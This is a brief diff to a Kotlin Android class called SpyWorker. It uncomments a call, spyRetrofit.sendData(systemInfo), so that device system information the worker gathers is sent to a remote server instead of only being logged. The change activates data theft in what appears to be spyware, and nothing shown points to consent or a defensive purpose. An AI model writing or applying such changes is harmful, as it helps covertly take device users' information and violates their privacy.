@@ -19,6 +19,6 @@ class SpyWorker(appContext: Context, workerParams: WorkerParameters):
     private fun sendInformation() {
         val systemInfo = SpyUtils.getSystemInfo(applicationContext)
         Log.d("SYSINFO", systemInfo.toString())
-        //spyRetrofit.sendData(systemInfo)
+        spyRetrofit.sendData(systemInfo)
     }
 }
